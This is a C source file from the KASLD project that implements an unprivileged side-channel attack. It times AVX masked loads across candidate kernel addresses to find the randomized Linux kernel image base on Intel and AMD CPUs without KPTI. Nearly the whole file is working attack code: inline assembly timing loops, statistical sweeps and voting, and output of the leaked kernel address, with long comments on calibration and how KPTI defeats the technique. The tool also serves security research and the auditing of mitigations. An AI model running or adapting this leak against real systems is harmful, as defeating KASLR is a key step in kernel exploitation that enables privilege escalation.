// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Kernel image location from AVX masked-load translation timing.
//
// The AVX masked load/store instructions suppress faults for the elements whose
// mask bits are clear. With every bit clear the instruction loads nothing and
// raises no exception, even for a kernel address — so an unprivileged process
// can present any address to the memory management unit and time the result
// with no signal handler, no fault path and no cache covert channel. What the
// latency reports is how far the address translation got, which differs between
// a slot the kernel image occupies and one it does not.
//
// The two vendors present that difference in opposite directions, and the
// direction is measured rather than assumed:
//
//   Intel: the image is a contiguous band of FASTER slots. Its left edge lands
//   on the KASLR grid, so the edge is the image base. Measured on a Core
//   i7-12800H with KPTI inactive: twenty-seven adjacent slots of 512 stand out
//   below the floor with nothing else anywhere in the window, and the edge
//   reproduces byte-exact across nine consecutive runs.
//
//   AMD: kernel addresses walk the page tables whether or not they are mapped,
//   so the band does not appear. What stands out instead is a handful of SLOWER
//   slots inside the image, where 4 KiB mappings make the walk terminate a
//   level deeper than the 2 MiB mappings around them. Only the split regions
//   stand out, so the slots found are a sparse subset of the image rather than
//   its full extent, and the base they bound is bounded loosely. Measured on a
//   Ryzen 5 5600GT: six slots level with the reference against a floor 540
//   cycles below it, every one above _text and none below, identical across
//   repeated runs.
//
// A user-space page cannot supply that direction: a mapped user page is fast
// because its translation is cached, where no kernel translation is ever in the
// caller's TLB. The direction is therefore taken from whichever side of the
// floor holds spatially clustered outliers — noise scatters across the window,
// an image does not.
//
// Technique by Hyunwoo Choi, Suryeon Kim and Seungwon Shin: "AVX Timing
// Side-Channel Attacks against Address Space Layout Randomization" (DAC 2023).
// The paper times a mask that performs the load, making a mapped page the
// expensive case; the all-zero mask used here times the translation alone,
// which is why the reported direction is inverted from the paper's and why the
// AMD behaviour matches its page-table-level primitive rather than its TLB one.
//
// Leak primitive:
//   Data leaked:      kernel image base, or addresses inside the image
//   Kernel subsystem: arch/x86 — address translation timing
//   Data structure:   kernel image page tables
//   Address type:     virtual (kernel image)
//   Method:           timing (masked-load latency)
//   Status:           unfixed, but defeated by KPTI where that is active
//   Access check:     N/A (hardware side-channel — no kernel gate)
//   Source:           N/A (hardware side-channel)
//
// Mitigations:
//   KPTI defeats it. Kernel page-table isolation removes the image from the
//   page tables this process walks, so neither the band Intel shows nor the
//   split mappings AMD shows has anything left to distinguish it from an
//   unmapped slot. That confines the technique to parts running without KPTI:
//   on Intel, one unaffected by Meltdown or booted with it off; on AMD, the
//   default. Measured inert on a Core i7-8750H with KPTI active -- a flat
//   profile with no image anywhere in the window -- and live on a Core
//   i7-12800H without it. The component detects KPTI and declines, rather than
//   spending the sweep to report a signal that cannot be there.
//
//   Nothing else is deployed. The paper reports that FGKASLR does not prevent
//   it and that FLARE is bypassed. A hypervisor weakens it without defeating
//   it: nested paging adds a second translation to every walk, and under the
//   one measured here the image still stands out, but as a few scattered
//   interior slots rather than a band, so a base is bounded and not pinned. A
//   part that reads flat is reported as an inconclusive run rather than as an
//   absent technique, because a translation that does not leak and a hypervisor
//   that hides one cannot be told apart from here.
//
// Debugging:
//   -v / KASLD_VERBOSE          the control reading, the per-sweep floor and
//                               standout counts, and the slots carried through
//                               every sweep -- a few lines.
//   KASLD_AVX_MASKLOAD_DEBUG=1  the whole profile, every slot of every sweep
//                               with its signed difference from the reference,
//                               which is why a slot cheaper than the reference
//                               reads negative. Five hundred lines per
//                               sweep, which is the level at which a wrong
//                               answer is diagnosable: which side of the floor
//                               the image sat on, whether the standouts
//                               clustered, and whether the separation cleared
//                               the timestamp counter's step.
//
// References:
//   https://arxiv.org/pdf/2304.07940
//
// KASLD_BUILD_NO_OPTIMIZE: built -O0 (Makefile) so the optimizer cannot move
// the timed instruction relative to its fences. Unlike a fault path measured in
// microseconds, the quantity here is hundreds of cycles on a base of a few
// thousand.
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/sidechannel.h"
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

KASLD_EXPLAIN(
    "AVX masked-load timing (Choi, Kim & Shin, 2023): a masked load whose mask "
    "bits are clear touches an address without faulting, so its latency "
    "reports "
    "how far the address translation got without any privilege or fault "
    "handler. Timing the KASLR candidate slots locates the kernel image: on "
    "Intel as a band of faster slots whose left edge is the base, on AMD as "
    "slower slots inside the image where 4 KiB mappings deepen the page walk. "
    "Mitigated by KPTI, which unmaps the kernel from the page tables the "
    "caller walks.");

KASLD_META("method:timing\n"
           "phase:probing\n"
           "live:1\n"
           "discloses:virtual\n"
           "hardware:AVX masked-load translation timing (mitigated by KPTI)\n");

#define STEP KASLR_VIRT_ALIGN
#define NUM_SLOTS ((KERNEL_VIRT_TEXT_MAX - KERNEL_VIRT_TEXT_MIN) / STEP)

/* Samples per slot, and sweeps a slot must survive to be believed.
 *
 * Each sweep derives its own floor and spread and marks against its own
 * threshold, and a slot is kept only if it was marked in EVERY sweep. That is
 * stronger than clearing one bar repeatedly: the bar is rebuilt each time from
 * the conditions that produced it.
 *
 * Unanimity rather than a majority. A majority was measured and is too weak --
 * on a machine with no signal at all, strays that landed in two sweeps of three
 * passed both this gate and the clustering test. Individual sweeps on a part
 * that does carry the signal mark anywhere from six to eleven slots; only the
 * intersection is the true set. */
#define ITERS 256
#define PASSES 5

/* Masked loads timed together per sample.
 *
 * The timestamp counter does not tick in cycles. On one part measured here it
 * advances in units of 36, and a single load separates the image from its
 * surroundings by 252 against a 216 floor -- exactly one of those units. A
 * one-LSB signal reproduces perfectly while conditions hold and vanishes when
 * they shift by a hair, which is what a run that found six slots and then, on
 * the next invocation, one was showing.
 *
 * Timing a batch and leaving the total undivided multiplies the separation by
 * the batch size while the quantum stays where it is. The loads go to the same
 * address deliberately: a translation that is never cached is re-walked every
 * time, so the repeats accumulate signal rather than measuring a hit. Where
 * they ARE cached the batch saturates after the first, which shows up as a
 * batch that reads no better than a single load rather than as a wrong answer.
 */
#define BATCH 32

/* A slot stands out when it clears the floor by this many parts in a hundred
 * of the reference's own cost -- a whole batch of loads, not one of them.
 *
 * Not a fraction of the profile's spread. The spread is max minus min, which
 * one extreme slot controls: where a single slot reads far from everything
 * else the bar rises above the real separation, that sweep marks a different
 * set from its neighbours, and the intersection comes out empty while every
 * sweep in the run had in fact found the image.
 *
 * A median absolute deviation is the usual robust answer and does not work
 * here either: the readings quantise hard enough that on one part 506 of 512
 * slots carry exactly the same value, which puts the deviation at zero and the
 * bar on the floor itself.
 *
 * A fixed fraction of the reference's cost is immune to both, and it holds
 * while that cost moves -- which it does, by half again between an idle and a
 * loaded machine, and by more than twice across repeated runs of the same
 * binary -- because the separation is itself a roughly constant fraction of
 * it. The separations measured run from six to seventeen per cent, and what
 * remains of the slot-to-slot noise once the reference is subtracted is a
 * couple of quanta, so the bar sits between them with room on each side. */
#define STANDOUT_PERCENT 3

/* Most of the window one sweep may mark before the run is judged unreadable.
 *
 * The bar is a fixed fraction of the reference's cost, which holds while the
 * profile's dispersion stays well inside it. Once in some thirty runs on one
 * part it does not: the floor lands 1512 ABOVE the reference where the same
 * binary on the same machine otherwise sits 540 below it, and between 161 and
 * 202 slots of 512 clear the bar in every sweep. Unanimity then keeps the four
 * that happen to repeat and the clustering gate passes them at 12.7 per cent
 * of the window, so the component names an address 732 MiB from the kernel
 * with nothing in the output to suggest the run was worthless.
 *
 * The reference is not what moved. Its own cost reads 5364 in that state
 * against 5328 to 5436 in every good run, so the shift is confined to the
 * kernel-range measurements while the user page beside them is untouched.
 * That is exactly the shift differencing cannot remove: cancelling requires
 * both halves of an iteration to move together, and here only one does. The
 * floor follows the shift, so the shift alone would be harmless; what defeats
 * the bar is the dispersion that arrives with it.
 *
 * What puts the range into that state is not established, and it has resisted
 * deliberate reproduction under load and under concurrent runs alike. The cap
 * therefore keys on the symptom, which is measurable in the sweep exhibiting
 * it, rather than on a cause that is not. Rarity argues for the cap rather
 * than against it: the state does not always produce a wrong answer -- where
 * the noise fails to repeat the run declines on its own -- so what reaches a
 * user is an address that is wrong once in some tens of runs and carries
 * nothing to distinguish it from the rest.
 *
 * An eighth of the candidate window is a 128 MiB image, comfortably past any
 * kernel and more than twice the largest legitimate set measured -- twenty-
 * seven slots where the whole image bands, six where only its 4 KiB mappings
 * show. A quarter was tried first and is too generous to do the job: one
 * disturbed sweep marked 74, which clears a cap of 128, so a run whose sweeps
 * all resembled that one would have reached the later gates -- and those are
 * the gates already observed passing four noise slots.
 *
 * The cap is a coarse rejection, not a proof. It bounds how unreadable a
 * profile may be and still be read; it cannot separate a mildly disturbed
 * sweep from a clean one, and nothing here can. Its direction of error is the
 * safe one: declining a legitimate run costs a technique, admitting a
 * disturbed one costs an address that is wrong without looking wrong. */
#define SWEEP_MARK_CAP ((int)(NUM_SLOTS / 8))

/* Shortest run that may be read as an image at all, whatever share it holds. */
#define BAND_MIN 6

/* Standouts a side needs before it can be read as the image at all.
 *
 * The side with the tighter extent wins, and a set of one slot has the tightest
 * extent there is -- one slot in five hundred. So a single stray on the empty
 * side beat three genuine samples on the other, and the component reported the
 * stray and discarded them. A lone slot is not evidence of an image whichever
 * direction it points. */
#define MIN_STANDOUTS 3

/* How far apart the two control readings must be before the instrument is
 * believed, as a fraction of the smaller.
 *
 * The control exists to answer one question: does a masked load report page
 * state at all on this part. Exact equality is almost no test -- a single cycle
 * of difference passes it, and a part where the primitive is nearly dead would
 * clear a gate written to stop exactly that. A quarter is far below every
 * separation measured (the weakest was a factor of five, under a hypervisor)
 * and far above the one or two percent two indistinguishable readings drift
 * by. */
#define CONTROL_MIN_RATIO 4

/* The share of all standouts a run must account for before its left edge is
 * read as the image base.
 *
 * Length alone is the wrong test. Where the image shows as scattered slots at
 * its 4 KiB mappings, several of those fall in adjacent slots by chance -- a
 * run of three was measured on one part, against a base 36 MiB below that run's
 * left edge. Pinning it would have placed the base a long way from the truth,
 * at timing confidence, in the likely window.
 *
 * What separates the two shapes is not how long the run is but how much of the
 * evidence it accounts for. A band that IS the image contains essentially every
 * standout the sweep found; a run inside a scattered set contains a fraction.
 * Three quarters separates the measured cases -- 27 of 27 against 3 of 6 -- and
 * keeps working for a small image, where a length threshold chosen for a large
 * one would refuse to pin at all. */
#define BAND_SHARE_NUM 3
#define BAND_SHARE_DEN 4

/* Per-slot firehose. -v carries the summary; this carries the measurement it
 * was derived from. Kept apart because the profile is five hundred lines per
 * sweep, and because a wrong answer here has never been diagnosable from the
 * summary alone. */
static int debug_mode;

static int cmp_u64(const void *a, const void *b) {
  uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
  return x < y ? -1 : x > y;
}
static int cmp_i64(const void *a, const void *b) {
  int64_t x = *(const int64_t *)a, y = *(const int64_t *)b;
  return x < y ? -1 : x > y;
}

/* Median cost of BATCH masked loads at `addr`, undivided.
 *
 * The total is deliberately not divided by BATCH: the separation being measured
 * is around one tick of a timestamp counter that does not advance in single
 * cycles, and dividing would quantise it away again. What the batch buys is
 * exactly that the reported number is BATCH times the per-load difference while
 * the counter's step stays where it is.
 *
 * The minimum would be the natural choice for a floor-seeking measurement, but
 * an rdtsc pair that fails to advance reads as zero work and the minimum
 * latches onto it; the median cannot. */
static uint64_t one_batch(unsigned long addr) {
  uint64_t t0, t1;

  __asm__ volatile("vpxor %%ymm1, %%ymm1, %%ymm1\n\t"
                   "mov %3, %%ecx\n\t"
                   "lfence\n\t"
                   "rdtsc\n\tshl $32, %%rdx\n\tor %%rdx, %%rax\n\t"
                   "mov %%rax, %0\n\tlfence\n\t"
                   "1:\n\t"
                   "vmaskmovps (%2), %%ymm1, %%ymm0\n\t"
                   "dec %%ecx\n\t"
                   "jnz 1b\n\t"
                   "lfence\n\t"
                   "rdtsc\n\tshl $32, %%rdx\n\tor %%rdx, %%rax\n\t"
                   "mov %%rax, %1\n\t"
                   : "=&r"(t0), "=&r"(t1)
                   : "r"(addr), "i"(BATCH)
                   : "rax", "rcx", "rdx", "ymm0", "ymm1", "memory", "cc");
  return t1 - t0;
}

static uint64_t maskload_cycles(unsigned long addr) {
  static uint64_t s[ITERS];
  int i;

  for (i = 0; i < ITERS; i++)
    s[i] = one_batch(addr);
  qsort(s, ITERS, sizeof s[0], cmp_u64);
  return s[ITERS / 2];
}

/* Cost of a slot measured against a reference address timed beside it.
 *
 * What a slot costs on its own is not usable. The readings arrive in two
 * clusters, on one part 792 apart, and which cluster a slot lands in is a
 * property of when it was measured rather than of the address: the same slot
 * reads in one cluster on one sweep and the other on the next, in
 * time-correlated blocks. The offset that locates the image is 576 on that
 * part -- smaller than the gap between the clusters -- so a bar set from the
 * profile's own middle falls between the clusters and splits the window in
 * half along a line that carries no information about the kernel.
 *
 * The shift is additive and shared: the image slots read 6948 and 7524 in a
 * sweep whose bulk sat at 6948, and 6156 and 6732 in one whose bulk sat at
 * 6156 -- the same 576 on top of either. Timing a fixed reference address in
 * the same iteration and keeping the difference cancels it exactly, which
 * repetition cannot do, because the shift outlasts every iteration spent on a
 * single slot.
 *
 * The reference is an unmapped user page. Its absolute cost is immaterial;
 * only that it is constant across the sweep and shares each measurement's
 * shift. */
static int64_t maskload_delta(unsigned long addr, unsigned long ref) {
  static int64_t s[ITERS];
  int i;

  for (i = 0; i < ITERS; i++) {
    uint64_t a = one_batch(addr);
    uint64_t b = one_batch(ref);
    s[i] = (int64_t)a - (int64_t)b;
  }
  qsort(s, ITERS, sizeof s[0], cmp_i64);
  return s[ITERS / 2];
}

static int has_avx(void) {
  unsigned int eax, ebx, ecx, edx, xcr0_lo, xcr0_hi;

  if (__get_cpuid_max(0, NULL) < 1)
    return 0;
  __cpuid(1, eax, ebx, ecx, edx);
  /* AVX usable by this process is a CPU question and an OS one. The AVX bit
   * (ECX 28) says the silicon has it; the instructions still fault with #UD
   * unless the OS turned XSAVE on and asked for the AVX state to be saved, as
   * a kernel booted with noxsave has not. OSXSAVE (ECX 27) reports that, and
   * gates the XCR0 read below: XGETBV without it is itself #UD. */
  if (!((ecx >> 27) & 1) || !((ecx >> 28) & 1))
    return 0;
  /* XGETBV(0), spelled in bytes so this file needs no -mxsave. XCR0 bit 1 is
   * the XMM half and bit 2 the YMM half; a masked load needs both. */
  __asm__ volatile(".byte 0x0f, 0x01, 0xd0"
                   : "=a"(xcr0_lo), "=d"(xcr0_hi)
                   : "c"(0));
  (void)xcr0_hi;
  return (xcr0_lo & 0x6) == 0x6;
}

/* One sweep of the candidate window. The first sweep of a run is discarded by
 * the caller: a cold scan reads several times high for its first slots, which
 * is where it started and not where anything is mapped. */
static void sweep(int64_t *out, unsigned long ref) {
  size_t i;

  for (i = 0; i < NUM_SLOTS; i++)
    out[i] =
        maskload_delta(KERNEL_VIRT_TEXT_MIN + (unsigned long)i * STEP, ref);
}

/* Mark the slots that stand out on one side of the floor. Returns the count. */
static int mark(const int64_t *t, int64_t thresh, int above, char *flag) {
  size_t i;
  int n = 0;

  for (i = 0; i < NUM_SLOTS; i++) {
    flag[i] = above ? t[i] > thresh : t[i] < thresh;
    n += flag[i];
  }
  return n;
}

/* How tightly a marked set clusters, as the fraction of the window its extent
 * spans. The image occupies a small part of the candidate range, so a real
 * signal is compact whichever direction it points; scattered marks are noise
 * that happened to clear the threshold. */
static double extent_fraction(const char *flag) {
  size_t i, lo = NUM_SLOTS, hi = 0;
  int any = 0;

  for (i = 0; i < NUM_SLOTS; i++)
    if (flag[i]) {
      if (!any) {
        lo = i;
        any = 1;
      }
      hi = i;
    }
  return any ? (double)(hi - lo + 1) / (double)NUM_SLOTS : 1.0;
}

int main(int argc, char **argv) {
  static int64_t t[NUM_SLOTS], sorted[NUM_SLOTS];
  static char flag[NUM_SLOTS];
  unsigned char *page, *hole;
  uint64_t t_map, t_unmap, scale;
  int64_t floor, hi_t, lo_t;
  int pass, n_hi, n_lo, above, n, run, best_run, best_at;
  size_t j;

  kasld_cli(argc, argv);
  if (kasld_skip_live_probe("avx_maskload"))
    return 0;

  debug_mode = getenv("KASLD_AVX_MASKLOAD_DEBUG") != NULL;

  /* Announce before the first measurement, and report each sweep as it lands.
   * A full run sweeps the candidate window PASSES times and takes seconds; with
   * nothing printed until the end that is indistinguishable from a hang, and it
   * is the whole of the output if a short per-component timeout kills the run
   * partway. */
  kasld_info("trying AVX masked-load translation timing ...");

  if (!has_avx()) {
    kasld_err("AVX is not supported on this CPU");
    return kasld_disp_absent("no AVX");
  }
  /* KPTI leaves nothing to time. It removes the kernel image from the page
   * tables this process walks, so an image slot and an empty one are both
   * simply absent and read alike -- the band disappears on Intel and the split
   * mappings disappear on AMD. The sweep would spend seconds to report no
   * signal, which is true but says nothing about why. What does stay mapped
   * under KPTI is the entry trampoline, and locating that is a different
   * technique with its own instrument. */
  if (detect_kpti()) {
    kasld_err("KPTI is active: the kernel image is absent from this process's "
              "page tables and its translation cannot be timed");
    return kasld_disp_mitigation("kpti", "KPTI active");
  }

  pin_cpu(0);

  /* The instrument must separate two user pages of known, opposite state before
   * any kernel address is believed. This says nothing about the direction the
   * kernel window will take -- only that the masked load reports page state at
   * all on this part.
   *
   * Both control addresses are obtained from the kernel rather than assumed.
   * The unmapped one is a page this process mapped and then unmapped, so it is
   * known to be a hole in this address space; a fixed address picked for
   * looking empty is a guess about someone else's memory map, and where the
   * guess is wrong the control compares two MAPPED pages and certifies an
   * instrument nobody tested.
   *
   * The hole outlives the control: every slot in every sweep is timed against
   * it. An allocation that reclaimed those four kibibytes partway would turn
   * the reference into a mapped page and shift every difference after it, with
   * nothing in the output to show for it, so the hole is confirmed still empty
   * once the sweeps are done rather than assumed to have stayed that way. */
  page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
              -1, 0);
  hole = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
              -1, 0);
  if (page == MAP_FAILED || hole == MAP_FAILED)
    return kasld_disp_inconclusive("could not allocate the control pages");
  memset(page, 1, 4096);
  munmap(hole, 4096);

  t_map = maskload_cycles((unsigned long)page);
  t_unmap = maskload_cycles((unsigned long)hole);
  kasld_info("control: mapped user page %lu cycles, unmapped %lu",
             (unsigned long)t_map, (unsigned long)t_unmap);
  {
    uint64_t lo_c = t_map < t_unmap ? t_map : t_unmap;
    uint64_t d = t_map < t_unmap ? t_unmap - t_map : t_map - t_unmap;

    if (d * CONTROL_MIN_RATIO < lo_c) {
      kasld_err("two user pages of known, opposite state read %lu and %lu: too "
                "close to tell apart",
                (unsigned long)t_map, (unsigned long)t_unmap);
      return kasld_disp_inconclusive(
          "masked load reports no usable page state (hypervisor, or a part "
          "that does not leak translation timing)");
    }
  }

  /* The bar is a fraction of what one measurement costs, and the reference is
   * measured on the same instrument in the same units, so its own cost is that
   * scale. Taking it from the reference rather than from the sweep keeps the
   * bar independent of the sweep it judges. */
  scale = t_unmap;

  sweep(t, (unsigned long)hole); /* discarded: warm-up */

  /* Vote across the sweeps; do not require them to agree exactly.
   *
   * The slots that locate the image repeat: on the part measured here the same
   * six appear in nearly every sweep. What does not repeat is the occasional
   * stray somewhere else in the window, and demanding an identical set lets one
   * such stray in one sweep discard six slots that appeared in all of them --
   * three runs in four were thrown away that way. A slot earns its place by
   * appearing in EVERY sweep; a stray appears in one and is dropped.
   *
   * Unanimity, not a majority. A majority was tried and is too weak: on a
   * machine with no signal at all, noise slots that happened to land in two
   * sweeps of three passed both this gate and the clustering test, and the
   * component emitted interior samples of an image it had not found. Demanding
   * every sweep, over more sweeps than the strays survive, keeps the repeatable
   * set and discards the rest -- the point of repeating is to filter, and a
   * filter that admits two-thirds noise is not one.
   *
   * The direction is voted the same way and decided once, over the voted sets,
   * rather than per sweep. */
  {
    static int votes_up[NUM_SLOTS], votes_dn[NUM_SLOTS];
    static char up[NUM_SLOTS], down[NUM_SLOTS];
    int need = PASSES;
    double e_up, e_down;

    memset(votes_up, 0, sizeof votes_up);
    memset(votes_dn, 0, sizeof votes_dn);

    for (pass = 0; pass < PASSES; pass++) {
      sweep(t, (unsigned long)hole);
      memcpy(sorted, t, sizeof sorted);
      qsort(sorted, NUM_SLOTS, sizeof sorted[0], cmp_i64);
      floor = sorted[NUM_SLOTS / 2];
      hi_t = floor + (int64_t)(scale * STANDOUT_PERCENT / 100);
      lo_t = floor - (int64_t)(scale * STANDOUT_PERCENT / 100);

      n_hi = mark(t, hi_t, 1, up);
      n_lo = mark(t, lo_t, 0, down);
      kasld_info("sweep %d of %d: floor %+ld, %d slower, %d faster", pass + 1,
                 PASSES, (long)floor, n_hi, n_lo);
      if (n_hi > SWEEP_MARK_CAP || n_lo > SWEEP_MARK_CAP) {
        kasld_err("sweep %d marks %d of %d slots: the profile is too dispersed "
                  "for the threshold to separate anything",
                  pass + 1, n_hi > n_lo ? n_hi : n_lo, (int)NUM_SLOTS);
        return kasld_disp_inconclusive(
            "the window reads too noisily to locate an image");
      }
      if (debug_mode)
        for (j = 0; j < NUM_SLOTS; j++)
          kasld_info("pass %d slot 0x%016lx %+8ld %s", pass,
                     KERNEL_VIRT_TEXT_MIN + (unsigned long)j * STEP, (long)t[j],
                     up[j]     ? "slower"
                     : down[j] ? "faster"
                               : "-");
      for (j = 0; j < NUM_SLOTS; j++) {
        votes_up[j] += up[j];
        votes_dn[j] += down[j];
      }
    }

    /* Every difference above was taken against the hole, so the hole must still
     * be one. mincore fails with ENOMEM for an unmapped range and succeeds for
     * a mapped one, so success here means the page came back and the sweeps
     * measured against two different references without saying so. */
    {
      unsigned char vec;

      errno = 0;
      if (mincore(hole, 4096, &vec) == 0 || errno != ENOMEM) {
        kasld_err("the reference page stopped being unmapped during the sweep");
        return kasld_disp_inconclusive(
            "the timing reference did not stay unmapped");
      }
    }

    for (j = 0; j < NUM_SLOTS; j++) {
      up[j] = votes_up[j] >= need;
      down[j] = votes_dn[j] >= need;
    }
    n_hi = n_lo = 0;
    for (j = 0; j < NUM_SLOTS; j++) {
      n_hi += up[j];
      n_lo += down[j];
    }
    e_up = n_hi ? extent_fraction(up) : 1.0;
    e_down = n_lo ? extent_fraction(down) : 1.0;
    kasld_info("carried by all %d of %d sweeps: %d slower (extent %.1f%%), %d "
               "faster (extent %.1f%%)",
               need, PASSES, n_hi, 100.0 * e_up, n_lo, 100.0 * e_down);

    if (n_hi < MIN_STANDOUTS)
      n_hi = 0;
    if (n_lo < MIN_STANDOUTS)
      n_lo = 0;
    if (!n_hi && !n_lo) {
      kasld_err("no side carries %d slots through every sweep", MIN_STANDOUTS);
      return kasld_disp_inconclusive("no repeatable signal in the window");
    }
    above = n_hi && (!n_lo || e_up <= e_down);
    memcpy(flag, above ? up : down, sizeof flag);
    n = above ? n_hi : n_lo;
    if (extent_fraction(flag) > 0.25) {
      kasld_err("the slots carried by every sweep are scattered across the "
                "window, not clustered");
      return kasld_disp_inconclusive("repeatable slots do not cluster");
    }
  }

  /* One interior sample on the wire: the lowest.
   *
   * Every standout is inside the image, so each is a legitimate interior
   * sample, but only the lowest carries information. An interior sample bounds
   * the base from ABOVE -- base <= sample -- and the engine's rule keeps the
   * minimum and discards the rest, so twenty-seven of them state once what one
   * states, and fill the evidence block with a single finding repeated.
   *
   * That the bound is an upper one is what limits the damage when a standout is
   * not in fact inside the image. A sample inside gives a true bound and one
   * above it a true but looser one; only a standout BELOW the base states
   * something false. The unanimity and clustering gates thin that case out but
   * do not close it -- an observed run carried four noise slots through every
   * sweep and they clustered tightly enough to pass. What keeps such a run
   * from reporting at all is the dispersion cap, which rejects a profile too
   * scattered to read rather than trying to tell the survivors apart
   * afterwards.
   *
   * The emission sits below the confidence floor either way, so it refines the
   * likely window and can never narrow the guaranteed one.
   *
   * The full set is still printed under -v. Where the standouts are scattered
   * their offsets from the base are a property of the kernel build rather than
   * of its placement, so the pattern is worth being able to see even though
   * nothing consumes it yet. */
  {
    unsigned long lowest = 0;

    for (j = 0; j < NUM_SLOTS; j++)
      if (flag[j]) {
        unsigned long a = KERNEL_VIRT_TEXT_MIN + (unsigned long)j * STEP;

        kasld_debug("image interior: 0x%016lx", a);
        if (!lowest)
          lowest = a;
      }
    if (lowest)
      kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_IMAGE, lowest, NULL,
                          CONF_TIMING);
  }

  /* A contiguous band additionally pins the base: the sweep grid is the KASLR
   * grid, so the leftmost slot of the band is the image base itself. The slot
   * below it must NOT stand out -- without that the band's left edge is only
   * the edge of the scan or of a longer region, and the samples above already
   * carry everything that was measured. */
  run = best_run = 0;
  best_at = -1;
  for (j = 0; j < NUM_SLOTS; j++) {
    if (flag[j]) {
      if (++run > best_run) {
        best_run = run;
        best_at = (int)j - run + 1;
      }
    } else {
      run = 0;
    }
  }

  kasld_info("%d slots stand out, longest run %d (%d%% of them), %s than the "
             "floor",
             n, best_run, n ? 100 * best_run / n : 0,
             above ? "slower" : "faster");

  if (best_run >= BAND_MIN && best_at > 0 && !flag[best_at - 1] &&
      (long)best_run * BAND_SHARE_DEN >= (long)n * BAND_SHARE_NUM) {
    unsigned long base = KERNEL_VIRT_TEXT_MIN + (unsigned long)best_at * STEP;

    if (base >= KERNEL_VIRT_TEXT_MIN && base <= KERNEL_VIRT_TEXT_MAX) {
      kasld_found("kernel image base (_text): 0x%016lx", base);
      kasld_result_base(KASLD_TYPE_VIRT, REGION_KERNEL_IMAGE, base, "_text",
                        CONF_TIMING);
      return 0;
    }
  }

  kasld_info("no confirmed band left edge; reporting interior samples only");
  return 0;
}
